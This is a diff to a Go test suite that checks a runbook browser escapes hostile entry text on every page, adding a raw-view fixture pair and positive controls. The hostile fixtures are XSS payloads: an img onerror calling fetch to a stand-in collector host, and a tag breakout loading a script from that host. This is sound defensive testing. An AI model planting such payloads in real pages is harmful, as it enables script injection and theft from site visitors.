@@ -143,6 +143,19 @@ const (
 	// finding when it is a fixture mismatch.
 	hostileCodeSpan = "  see `</code><img src=x onerror=\"fetch('//collector.invalid/c')\">` for the steps"
 	benignCodeSpan  = "  see `docs/rollout.md` for the steps"
+
+	// 🔴 THE RAW VIEW'S FIXTURE, AND IT IS THE WIDEST SINK ON THE SURFACE: the WHOLE
+	// FILE, front matter included, through a single `g.Text`. Every other fixture here is
+	// something a parser accepted first.
+	//
+	// ⚠ SHAPE-MATCHED LINE FOR LINE WITH THE BENIGN ONE, which is what keeps the
+	// differential about ESCAPING rather than about fixture size — the same rule the
+	// code-span pair above is written to. Neither carries a backtick, so neither adds a
+	// `<code>` element on its own.
+	hostileRaw = "---\nservice: runbook\n---\n\n## What it is\n\n" +
+		`</code></pre><script src="//collector.invalid/raw.js"></script><pre><code>`
+	benignRaw = "---\nservice: runbook\n---\n\n## What it is\n\n" +
+		`the rollout runbook, as the file has it`
 )
 
 // benignWorld mirrors [hostileWorld] SHAPE FOR SHAPE: one scope, one entry, one
@@ -158,6 +171,7 @@ func benignWorld() []Scope {
 			Ref:      "runbook",
 			Title:    "Rollout notes",
 			Filename: "runbook.md",
+			Raw:      benignRaw,
 			Aliases:  []string{"rollout"},
 			Tasks: []string{
 				"jira:PLAT-1",
@@ -189,6 +203,7 @@ func hostileWorld() []Scope {
 			Ref:      hostileRef,
 			Title:    hostileTitle,
 			Filename: hostileRef + ".md",
+			Raw:      hostileRaw,
 			Aliases:  []string{hostileAlias},
 			Tasks: []string{
 				hostileTaskScript,
@@ -279,7 +294,12 @@ func renderedPages(t *testing.T, world []Scope) map[string]string {
 		"navigate": renderNode(t, NavigatePage(v)),
 		"scope":    renderNode(t, ScopePage(scopeView)),
 		"entry":    renderNode(t, EntryPage(entryView)),
-		"search":   renderNode(t, Page(searchView)),
+		// 🔴 THE RAW VIEW IS ITS OWN PAGE STATE AND THE DIFFERENTIAL IS PER STATE, so
+		// omitting it would leave the surface's WIDEST sink — the whole file through one
+		// `g.Text` — covered by nothing here. It is the same `EntryPage`, so a row rather
+		// than a second harness.
+		"entry-raw": renderNode(t, EntryPage(rawViewOf(entryView))),
+		"search":    renderNode(t, Page(searchView)),
 	}
 }
 
@@ -294,6 +314,22 @@ func TestHostileEntryTextIsEscapedOnEveryBrowsePage(t *testing.T) {
 		t.Fatal("POSITIVE CONTROL FAILED: the heading/bullet/body/code-span fixtures carry NOTHING the token " +
 			"scanner recognises, so a zero on the rendered entry page below would mean nothing")
 	}
+	// 🔴 AND THE SAME CONTROL FOR THE RAW FIXTURE, WHICH HAD NONE. The `entry-raw` row
+	// carries the widest sink on the surface — the whole file — and its two fixtures were
+	// in neither the token count above nor the shape comparison below. If `hostileRaw`
+	// were ever softened to something whose markup shape equals `benignRaw`'s, that row
+	// would compare equal, the token scan would find nothing, and NO control in this test
+	// would notice: the widest sink would pass vacuously in a fully green suite.
+	if structureOf(hostileRaw) == structureOf(benignRaw) {
+		t.Fatalf("POSITIVE CONTROL FAILED: the hostile and benign RAW fixtures carry the same markup "+
+			"shape (%+v), so the `entry-raw` row of the differential below cannot detect an injection "+
+			"into the raw view at all", structureOf(hostileRaw))
+	}
+	if n := countTokens(hostileRaw); n == 0 {
+		t.Fatal("POSITIVE CONTROL FAILED: `hostileRaw` carries NOTHING the token scanner recognises, " +
+			"so a zero on the rendered raw page would mean nothing")
+	}
+
 	benignSectionContent := "## Pointers" + "prose" + "- a bullet" + benignCodeSpan
 	if structureOf(benignSectionContent) == structureOf(newlyReachable) {
 		t.Fatalf("POSITIVE CONTROL FAILED: the hostile section fixtures carry the same markup shape as the "+
@@ -1128,4 +1164,11 @@ func TestAnEmptyWorldRendersAnAuthorityAnswer(t *testing.T) {
 	if !strings.Contains(out, "operator@example.invalid") {
 		t.Error("the viewer's display name is missing from the page")
 	}
+}
+
+// rawViewOf is [PageView] with the raw view selected, so the differential can render the
+// same page in both of its states without either caller knowing how the switch is spelled.
+func rawViewOf(v PageView) PageView {
+	v.RawView = true
+	return v
 }
